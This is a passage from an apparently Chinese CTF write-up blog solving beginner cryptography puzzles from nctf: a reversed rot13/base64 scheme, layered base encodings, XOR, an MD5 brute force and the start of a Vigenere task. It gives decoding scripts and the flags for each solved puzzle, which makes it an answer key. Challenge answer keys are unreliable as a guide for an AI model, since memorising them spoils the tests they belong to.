</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-10>10</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>encode</span>($str){
</span></span><span style=display:flex><span>  $_o<span style=color:#f92672>=</span><span style=color:#a6e22e>strrev</span>($str);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span>($_0<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;$_0<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>strlrn</span>($_o),$_0<span style=color:#f92672>++</span>){
</span></span><span style=display:flex><span>    $_c<span style=color:#f92672>=</span><span style=color:#a6e22e>substr</span>($_o,$_0,<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    $__<span style=color:#f92672>=</span><span style=color:#a6e22e>ord</span>($_c)<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    $_c<span style=color:#f92672>=</span><span style=color:#a6e22e>chr</span>($__);
</span></span><span style=display:flex><span>    $_<span style=color:#f92672>=</span>$_<span style=color:#f92672>.</span>$_c;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>str_rot13</span>(<span style=color:#a6e22e>strrev</span>(<span style=color:#a6e22e>base64_encode</span>($_)));
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div></blockquote><p>encode函数先反转明文字符串，再逐字符加一，然后base64编码，再反转，再rot13，然后返回加密后的字符串。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-11>11</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$s<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>decode</span>($str){
</span></span><span style=display:flex><span>    $strtmp<span style=color:#f92672>=</span><span style=color:#a6e22e>base64_decode</span>(<span style=color:#a6e22e>strrev</span>(<span style=color:#a6e22e>str_rot13</span>($str)));
</span></span><span style=display:flex><span>    $res<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span>($i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;$i<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>strlen</span>($strtmp);$i<span style=color:#f92672>++</span>){
</span></span><span style=display:flex><span>        $res<span style=color:#f92672>.=</span><span style=color:#a6e22e>chr</span>(<span style=color:#a6e22e>ord</span>(<span style=color:#a6e22e>substr</span>($strtmp, $i,<span style=color:#ae81ff>1</span>))<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>strrev</span>($res);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>decode</span>($s);
</span></span></code></pre></td></tr></table></div></div><p><em>nctf{rot13and_base64and_strrev}</em></p><h4 id=mixed-base64httpctfnuptsastcomstaticuploads3e5c0c7045f2a81363a45d97d69911e3codetxt><a href=http://ctf.nuptsast.com/static/uploads/3e5c0c7045f2a81363a45d97d69911e3/code.txt>mixed base64</a><a hidden class=anchor aria-hidden=true href=#mixed-base64httpctfnuptsastcomstaticuploads3e5c0c7045f2a81363a45d97d69911e3codetxt>#</a></h4><blockquote><p>多重base64加密，干(sang)得(xin)漂(bing)亮(kuang)!</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-13>13</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> random
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>result<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;16&#39;</span>:<span style=color:#66d9ef>lambda</span> x:b16encode(x),
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;32&#39;</span>:<span style=color:#66d9ef>lambda</span> x:b32encode(x),
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;64&#39;</span>:<span style=color:#66d9ef>lambda</span> x:b64encode(x)
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>flag<span style=color:#f92672>=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;{nctf{***}&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>10</span>):
</span></span><span style=display:flex><span>  a<span style=color:#f92672>=</span>random<span style=color:#f92672>.</span>choice([<span style=color:#e6db74>&#39;16&#39;</span>,<span style=color:#e6db74>&#39;32&#39;</span>,<span style=color:#e6db74>&#39;64&#39;</span>])
</span></span><span style=display:flex><span>  flag<span style=color:#f92672>=</span>result[a](flag)
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;code.txt&#34;</span>,<span style=color:#e6db74>&#39;wb&#39;</span>)<span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>  f<span style=color:#f92672>.</span>write(flag)
</span></span></code></pre></td></tr></table></div></div></blockquote><p>解码代码：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-15>15</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b64decode, b32decode, b16decode
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;code.txt&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>    c <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>trys</span>(s):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> f <span style=color:#f92672>in</span> [b64decode, b32decode, b16decode]:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            t <span style=color:#f92672>=</span> f(s)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> t[:<span style=color:#ae81ff>4</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;nctf&#34;</span>:
</span></span><span style=display:flex><span>                print t
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                trys(t)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>trys(c)
</span></span></code></pre></td></tr></table></div></div><p><em>nctf{random_mixed_base64_encode}</em></p><h4 id=异性相吸httpctfnuptsastcomstaticuploads7ecc0dbd59f262e698b2dd94b39825bcbiubiubiuzip><a href=http://ctf.nuptsast.com/static/uploads/7ecc0dbd59f262e698b2dd94b39825bc/biubiubiu.zip>异性相吸</a><a hidden class=anchor aria-hidden=true href=#异性相吸httpctfnuptsastcomstaticuploads7ecc0dbd59f262e698b2dd94b39825bcbiubiubiuzip>#</a></h4><blockquote><p>同性真爱，异性相吸都是假的！
（题目要求，我是直的）</p><p>解密压缩文件里的内容</p><p>TIPS:
1.xor
2.hex2binary
3.len(bin(miwen))==len(bin(mingwen))</p></blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>c<span style=color:#f92672>=</span>open(<span style=color:#e6db74>&#39;密文.txt&#39;</span>)<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>p<span style=color:#f92672>=</span>open(<span style=color:#e6db74>&#39;明文.txt&#39;</span>)<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>s<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(c)):
</span></span><span style=display:flex><span> s<span style=color:#f92672>+=</span>chr(ord(c[i])<span style=color:#f92672>^</span>ord(p[i]))
</span></span><span style=display:flex><span>print s
</span></span></code></pre></td></tr></table></div></div><p><em>nctf{xor_xor_xor_biubiubiu}</em></p><h4 id=md5>MD5<a hidden class=anchor aria-hidden=true href=#md5>#</a></h4><blockquote><p>python大法好！
这里有一段丢失的md5密文
e9032???da???08????911513?0???a2
要求你还原出他并且加上nctf{}提交</p><p>已知线索 明文为： TASC?O3RJMV?WDJKX?ZM</p><p>题目来源：安恒杯</p></blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-12>12</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span>pool <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span>
</span></span><span style=display:flex><span>s0 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;TASC?O3RJMV?WDJKX?ZM&#39;</span>
</span></span><span style=display:flex><span>ss <span style=color:#f92672>=</span> s0<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;?&#39;</span>)
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;e9032???da???08????911513?0???a2&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> pool:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> pool:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> k <span style=color:#f92672>in</span> pool:
</span></span><span style=display:flex><span>            s <span style=color:#f92672>=</span> ss[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>+</span> i <span style=color:#f92672>+</span> ss[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>+</span> j <span style=color:#f92672>+</span> ss[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>+</span> k <span style=color:#f92672>+</span> ss[<span style=color:#ae81ff>3</span>]
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> hashlib<span style=color:#f92672>.</span>md5(s)<span style=color:#f92672>.</span>hexdigest()[:<span style=color:#ae81ff>5</span>] <span style=color:#f92672>==</span> m[:<span style=color:#ae81ff>5</span>]:
</span></span><span style=display:flex><span>                print s, hashlib<span style=color:#f92672>.</span>md5(s)<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>
</span></span></code></pre></td></tr></table></div></div><p><em>nctf{e9032994dabac08080091151380478a2}</em></p><h4 id=vigenere>Vigenere<a hidden class=anchor aria-hidden=true href=#vigenere>#</a></h4><blockquote><p>It is said that Vigenere cipher does not achieve the perfect secrecy actually :-)</p><p>Tips:
1.The encode pragram is given;
2.Do u no <a href=https://en.wikipedia.org/wiki/Index_of_coincidence>index of coincidence </a>？
3.The key is last 6 words of the plain text(with &ldquo;nctf{}&rdquo; when submitted, also without any interpunction)</p></blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-13>13</a>
